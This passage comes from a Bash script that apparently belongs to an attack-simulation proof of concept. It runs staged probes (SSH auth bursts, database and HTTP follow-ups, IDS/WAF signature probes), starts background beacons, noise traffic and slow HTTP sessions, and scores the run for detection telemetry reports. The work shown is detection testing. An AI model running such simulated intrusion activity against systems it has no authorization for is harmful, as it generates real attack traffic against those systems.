        fi
        return 0
    fi
    run_pipeline_stage "SSH Auth Burst" stage_ssh_auth_burst
    run_pipeline_stage "Redis Follow-up" stage_redis_followup
    run_pipeline_stage "Elastic Follow-up" stage_elastic_followup
    run_pipeline_stage "Mongo Follow-up" stage_mongo_followup
    run_pipeline_stage "HTTP/HTTPS Follow-up" stage_http_followup
    run_pipeline_stage "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
    if [[ "${include_windows}" == true ]]; then
        run_pipeline_stage "Windows Telemetry" stage_windows_telemetry
    fi
}

humanize_behavior_score() {
    local score=0
    score=$((score + TOTAL_CYCLES_COMPLETED * 5))
    score=$((score + ADAPTIVE_DECISION_COUNT * 8))
    score=$((score + HUMANIZE_BEACON_HTTP_COUNT / 2))
    score=$((score + HUMANIZE_BEACON_DNS_COUNT / 2))
    score=$((score + BURST_EVENTS * 3))
    score=$((score + SLOW_HTTP_SESSIONS * 10))
    if [[ "${PERSISTENT_BEACON}" == true ]]; then score=$((score + 25)); fi
    if [[ "${PIPELINE_OVERLAP}" == true ]]; then score=$((score + 20)); fi
    echo "${score}"
}

humanize_detection_density_score() {
    local d=0
    d=$((d + $(safe_int "$(sum_state_counter "executed_stages.log")") * 4))
    d=$((d + $(safe_int "$(sum_state_counter "beacon_attempt_count.log")") * 2))
    d=$((d + $(safe_int "$(sum_state_counter "exfil_attempt_count.log")") * 3))
    d=$((d + BURST_EVENTS * 5))
    echo "${d}"
}

humanize_timeline_complexity_score() {
    local c=0
    c=$((c + TOTAL_CYCLES_COMPLETED * 10))
    c=$((c + OVERLAP_GROUP_SEQ * 6))
    c=$((c + ADAPTIVE_DECISION_COUNT * 4))
    c=$((c + JITTER_SLEEP_TOTAL_SEC / 10))
    echo "${c}"
}

append_humanize_report_sections() {
    local ab d tc
    ab=$(humanize_behavior_score)
    d=$(humanize_detection_density_score)
    tc=$(humanize_timeline_complexity_score)
    if [[ -n "${REPORT_MD}" ]]; then
        cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## Human Operator Telemetry Summary

| Metric | Value |
|---|---|
| Attacker Behavior Score | ${ab} |
| Detection Density Score | ${d} |
| Timeline Complexity Score | ${tc} |
| Persistent Beacon | ${PERSISTENT_BEACON} (HTTP=${HUMANIZE_BEACON_HTTP_COUNT} DNS=${HUMANIZE_BEACON_DNS_COUNT}) |
| Pipeline Overlap | ${PIPELINE_OVERLAP} (max=${MAX_OVERLAP}) |
| Timing Profile | ${TIMING_PROFILE} |
| Noise Level | ${NOISE_LEVEL} |
| Warmup Minutes | ${WARMUP_MINUTES} |
| Burst Mode | ${BURST_MODE} (${BURST_EVENTS} events) |
| Slow HTTP | ${SLOW_HTTP} (${SLOW_HTTP_SECONDS}s) |

### Beacon Summary
- Interval: ${BEACON_INTERVAL_SEC}s jitter: ${JITTER_PERCENT}%
- Background loops: $([[ "${PERSISTENT_BEACON}" == true ]] && echo active || echo disabled)

### Overlap Timeline
$(read_state_file_or_none "overlap_timeline.log" | sed 's/^/- /')

### Adaptive Decision Log
$(read_state_file_or_none "adaptive_decisions.log" | sed 's/^/- /')

### Detection Opportunity Summary
- Process analytics: process chains, enumeration, scripted loops
- Network analytics: internal scan, beaconing, DNS entropy, long HTTP sessions
- UEBA: irregular timing (jitter), warmup→burst→active transitions
- IDS/IPS: burst spikes, failed SSH patterns, SMB/RPC probes

EOF
    fi
}

print_humanize_dry_run_plan() {
    cat <<EOF
[HUMAN-LIKE OPERATOR PLAN]
- Persistent beacon: ${PERSISTENT_BEACON} (interval=${BEACON_INTERVAL_SEC}s jitter=${JITTER_PERCENT}%)
- Pipeline overlap: ${PIPELINE_OVERLAP} (max=${MAX_OVERLAP})
- Timing profile: ${TIMING_PROFILE}
- Noise level: ${NOISE_LEVEL}
- Warmup: ${WARMUP_MINUTES} min | Burst: ${BURST_MODE} (${BURST_SECONDS}s)
- Slow HTTP: ${SLOW_HTTP} (${SLOW_HTTP_SECONDS}s)
- Adaptive operator: service-weighted follow-up after discovery
- Dry-run: no background workers started
EOF
}

start_humanize_services() {
    if [[ "${DRY_RUN}" == true ]]; then
        print_humanize_dry_run_plan
        return 0
    fi
    start_background_beacons
    start_noise_traffic
    start_slow_http_sessions
}

_stellar_humanize_self_check() {
    local fn missing=()
    for fn in count_remote_target_file run_stage_concurrent wait_all_humanize_workers \
        stage_adaptive_operator_followup run_followup_stages_adaptive; do
        declare -F "${fn}" >/dev/null 2>&1 || missing+=("${fn}")
    done
    if ((${#missing[@]} > 0)); then
        echo "stellar_poc_humanize.sh: missing required functions: ${missing[*]}" >&2
        exit 1
    fi
}
_stellar_humanize_self_check
